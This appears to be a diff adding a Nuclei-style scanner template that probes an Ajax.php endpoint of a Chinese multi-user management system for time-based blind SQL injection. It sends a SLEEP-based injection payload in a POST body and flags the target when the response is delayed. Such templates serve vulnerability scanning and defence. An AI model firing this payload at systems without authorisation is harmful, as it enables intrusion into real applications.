@@ -1,0 +1,34 @@
+id: poc-yaml-api-interface-call-mums-ajax-sqli
+info:
+  name: API接口调用多用户管理系统 Ajax SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+http:
+  - method: POST
+    path:
+      - "{{BaseURL}}/Ajax.php?order"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: "id=11' AND (SELECT 1465 FROM (SELECT(SLEEP({{t1}})))sMaC)-- Gxag"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "\"msg\":\"succ\""
+        part: body
+      - type: word
+        words:
+          - "application/json"
+        part: header
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1) && duration < to_number(t2)"
